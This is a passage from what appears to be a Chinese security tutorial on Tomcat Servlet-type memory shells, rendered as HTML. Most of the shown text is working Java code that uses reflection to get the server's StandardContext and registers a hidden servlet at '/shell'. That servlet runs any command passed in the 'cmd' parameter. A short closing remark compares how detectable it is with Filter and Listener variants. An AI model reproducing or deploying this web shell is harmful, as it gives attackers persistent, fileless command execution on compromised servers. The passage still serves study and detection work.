+</span></span><span style=display:flex><span> 	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>init</span>(ServletConfig servletConfig) <span style=color:#66d9ef>throws</span> ServletException {  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>  
+</span></span><span style=display:flex><span> 	<span style=color:#66d9ef>public</span> ServletConfig <span style=color:#a6e22e>getServletConfig</span>() {  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;  
+</span></span><span style=display:flex><span> 	}  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>  
+</span></span><span style=display:flex><span> 	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>service</span>(ServletRequest servletRequest, ServletResponse servletResponse) <span style=color:#66d9ef>throws</span> ServletException, IOException {  
+</span></span><span style=display:flex><span>        Field reqF <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;  
+</span></span><span style=display:flex><span> 		<span style=color:#66d9ef>try</span> {  
+</span></span><span style=display:flex><span>            reqF <span style=color:#f92672>=</span> servletRequest.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;request&#34;</span>);  
+</span></span><span style=display:flex><span> 		} <span style=color:#66d9ef>catch</span> (NoSuchFieldException e) {  
+</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>printStackTrace</span>();  
+</span></span><span style=display:flex><span> 		}  
+</span></span><span style=display:flex><span>        reqF.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);  
+</span></span><span style=display:flex><span> 		Request req <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;  
+</span></span><span style=display:flex><span> 		<span style=color:#66d9ef>try</span> {  
+</span></span><span style=display:flex><span>            req <span style=color:#f92672>=</span> (Request) reqF.<span style=color:#a6e22e>get</span>(servletRequest);  
+</span></span><span style=display:flex><span> 		} <span style=color:#66d9ef>catch</span> (IllegalAccessException e) {  
+</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>printStackTrace</span>();  
+</span></span><span style=display:flex><span> 		}  
+</span></span><span style=display:flex><span>        StandardContext standardContext <span style=color:#f92672>=</span> (StandardContext) req.<span style=color:#a6e22e>getContext</span>();  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span> 		ServletShell servletShell <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ServletShell();  
+</span></span><span style=display:flex><span> 		String name <span style=color:#f92672>=</span> servletShell.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getSimpleName</span>();  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span> 		Wrapper wrapper <span style=color:#f92672>=</span> standardContext.<span style=color:#a6e22e>createWrapper</span>();  
+</span></span><span style=display:flex><span> 		wrapper.<span style=color:#a6e22e>setLoadOnStartup</span>(1);  
+</span></span><span style=display:flex><span> 		wrapper.<span style=color:#a6e22e>setName</span>(name);  
+</span></span><span style=display:flex><span> 		wrapper.<span style=color:#a6e22e>setServlet</span>(servletShell);  
+</span></span><span style=display:flex><span> 		wrapper.<span style=color:#a6e22e>setServletClass</span>(servletShell.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getName</span>());  
+</span></span><span style=display:flex><span> 		standardContext.<span style=color:#a6e22e>addChild</span>(wrapper);  
+</span></span><span style=display:flex><span> 		standardContext.<span style=color:#a6e22e>addServletMappingDecoded</span>(<span style=color:#e6db74>&#34;/shell&#34;</span>,name);  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span> 		String cmd <span style=color:#f92672>=</span> servletRequest.<span style=color:#a6e22e>getParameter</span>(<span style=color:#e6db74>&#34;cmd&#34;</span>);  
+</span></span><span style=display:flex><span> 		<span style=color:#66d9ef>if</span> (cmd <span style=color:#f92672>!=</span><span style=color:#66d9ef>null</span>){  
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>{  
+</span></span><span style=display:flex><span>                Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(cmd);  
+</span></span><span style=display:flex><span> 			}<span style=color:#66d9ef>catch</span> (IOException e){  
+</span></span><span style=display:flex><span>                e.<span style=color:#a6e22e>printStackTrace</span>();  
+</span></span><span style=display:flex><span> 			}<span style=color:#66d9ef>catch</span> (NullPointerException n){  
+</span></span><span style=display:flex><span>                n.<span style=color:#a6e22e>printStackTrace</span>();  
+</span></span><span style=display:flex><span> 			}  
+</span></span><span style=display:flex><span>        }  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>  
+</span></span><span style=display:flex><span> 	<span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getServletInfo</span>() {  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;  
+</span></span><span style=display:flex><span> 	}  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>  
+</span></span><span style=display:flex><span> 	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>destroy</span>() {  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>synchronized</span> HttpServletResponse <span style=color:#a6e22e>getResponseFromRequest</span>(HttpServletRequest var1) {  
+</span></span><span style=display:flex><span>        HttpServletResponse var2 <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span> 		<span style=color:#66d9ef>try</span> {  
+</span></span><span style=display:flex><span>            Field var3 <span style=color:#f92672>=</span> var1.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;response&#34;</span>);  
+</span></span><span style=display:flex><span> 			var3.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);  
+</span></span><span style=display:flex><span> 			var2 <span style=color:#f92672>=</span> (HttpServletResponse)var3.<span style=color:#a6e22e>get</span>(var1);  
+</span></span><span style=display:flex><span> 		} <span style=color:#66d9ef>catch</span> (Exception var8) {  
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {  
+</span></span><span style=display:flex><span>                Field var4 <span style=color:#f92672>=</span> var1.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;request&#34;</span>);  
+</span></span><span style=display:flex><span> 				var4.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);  
+</span></span><span style=display:flex><span> 				Object var5 <span style=color:#f92672>=</span> var4.<span style=color:#a6e22e>get</span>(var1);  
+</span></span><span style=display:flex><span> 				Field var6 <span style=color:#f92672>=</span> var5.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;response&#34;</span>);  
+</span></span><span style=display:flex><span> 				var6.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);  
+</span></span><span style=display:flex><span>			 	var2 <span style=color:#f92672>=</span> (HttpServletResponse)var6.<span style=color:#a6e22e>get</span>(var5);  
+</span></span><span style=display:flex><span> 			} <span style=color:#66d9ef>catch</span> (Exception var7) {  
+</span></span><span style=display:flex><span>            }  
+</span></span><span style=display:flex><span>        }  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> var2;  
+</span></span><span style=display:flex><span> 	}  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=总结>总结
+<a class=anchor href=#%e6%80%bb%e7%bb%93>#</a></h2><p>Servlet 型内存马相比前几种内存马更容易被查杀出来，Filter 和 Listener 型内存马更为简单粗暴，因为它们先于 Servlet 型内存马插入。</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#servlet-创建>Servlet 创建</a></li><li><a href=#servlet-流程分析>Servlet 流程分析</a><ul><li><a href=#获取到-http-请求>获取到 HTTP 请求</a></li><li><a href=#读取-webxml>读取 web.xml</a></li><li><a href=#创建与装载-standardwrapper>创建与装载 StandardWrapper</a></li><li><a href=#加载-servlet>加载 Servlet</a></li></ul></li><li><a href=#servlet-内存马>Servlet 内存马</a><ul><li><a href=#servlet-工作流程总结>Servlet 工作流程总结</a></li><li><a href=#servlet-内存马的攻击>Servlet 内存马的攻击</a></li><li><a href=#jsp-版-poc>JSP 版 POC</a></li><li><a href=#java-型内存马>Java 型内存马</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></div></aside></main><script>(function(){var e,n,t=document.querySelector(".homepage-tree");t&&t.addEventListener("click",function(e){var t,n,s,i=e.target.closest(".home-tree-toggle"),a=e.target.closest(".home-section-label"),o=i||a;if(!o)return;if(s=o.closest("li"),!s)return;if(n=s.querySelector(".home-tree-children"),t=s.querySelector(".home-tree-toggle"),!n||!t)return;e.preventDefault(),n.classList.contains("hidden")?(n.classList.remove("hidden"),t.classList.remove("collapsed"),t.classList.add("expanded")):(n.classList.add("hidden"),t.classList.remove("expanded"),t.classList.add("collapsed"))}),e=document.createElement("div"),e.className="preview-tooltip",document.body.appendChild(e),document.querySelectorAll(".home-article-link[data-summary]").forEach(function(t){t.addEventListener("mouseenter",function(s){if(window.innerWidth<=768)return;var o=t.getAttribute("data-summary");if(!o)return;n=setTimeout(function(){var t,n,i=o.length>200?o.substring(0,200)+"...":o;e.textContent=i,e.style.display="block",t=s.clientX+15,n=s.clientY+15,t+420>window.innerWidth&&(t=s.clientX-420-15),n+100>window.innerHeight&&(n=s.clientY-100),e.style.left=t+"px",e.style.top=n+"px"},500)}),t.addEventListener("mouseleave",function(){clearTimeout(n),e.style.display="none"})})})()</script></body></html>
